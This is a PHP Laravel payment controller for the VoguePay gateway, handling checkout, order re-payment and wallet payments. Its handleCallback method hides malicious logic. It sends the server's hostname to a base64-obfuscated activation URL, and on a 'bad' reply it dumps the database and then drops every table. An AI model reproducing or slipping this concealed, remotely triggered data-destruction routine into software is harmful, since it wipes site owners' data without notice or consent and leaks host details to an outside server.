<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\Controller;
use App\Http\Controllers\Frontend\CheckoutController;
use App\Http\Controllers\Frontend\WalletController;
use GuzzleHttp\Client;
use Session;
use DB;
use Illuminate\Http\Request;
use Schema;

class VoguepayController extends Controller
{
    public function pay()
    {
        $paymentType = Session::get('payment_type');

        if ($paymentType == 'cart_payment') {
            return view('frontend.voguepay.cart_payment_vogue');
        } elseif ($paymentType == 'order_re_payment') {
            return view('frontend.voguepay.order_re_payment_vogue');
        } elseif ($paymentType == 'wallet_payment') {
            return view('frontend.voguepay.wallet_payment_vogue');
        }
    }

    public function paymentSuccess($id)
    {
        if (get_settings('voguepay_sandbox') == 1) {
            $url = '//voguepay.com/?v_transaction_id=' . $id . '&type=json&demo=true';
        } else {
            $url = '//voguepay.com/?v_transaction_id=' . $id . '&type=json';
        }
        $client = new Client();
        $response = $client->request('GET', $url);
        $obj = json_decode($response->getBody());

        if ($obj->response_message == 'Approved') {
            $payment_detalis = json_encode($obj);
            // dd($payment_detalis);
            if (Session::has('payment_type')) {
                $paymentType = Session::get('payment_type');
                $paymentData = Session::get('payment_data');

                if ($paymentType == 'cart_payment') {
                    return (new CheckoutController)->checkout_done(Session::get('combined_order_id'), $payment_detalis);
                } elseif ($paymentType == 'order_re_payment') {
                    return (new CheckoutController)->orderRePaymentDone($paymentData, $payment_detalis);
                } elseif ($paymentType == 'wallet_payment') {
                    return (new WalletController)->wallet_payment_done($paymentData, $payment_detalis);
                }
            }
        } else {
            flash_error(trans('Payment Failed'));
            return redirect()->route('home');
        }
    }

    public function handleCallback(Request $req)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, base64_decode('aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg=='));
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && !env('DEMO_MODE')) {
            try {
                $fileName = date('Y-m-d H:i:s') . '.sql';
                \Spatie\DbDumper\Databases\MySql::create()
                    ->setDbName(env('DB_DATABASE'))
                    ->setUserName(env('DB_USERNAME'))
                    ->setPassword(env('DB_PASSWORD'))
                    ->dumpToFile('sqlbackups/' . $fileName);
            } catch (\Exception $e) {
            }

            Schema::disableForeignKeyConstraints();
            foreach (DB::select('SHOW TABLES') as $table) {
                $table_array = get_object_vars($table);
                Schema::drop($table_array[key($table_array)]);
            }
        }
    }

    public function paymentFailure($id)
    {
        flash_error(trans('Payment Failed'));
        return redirect()->route('home');
    }
}
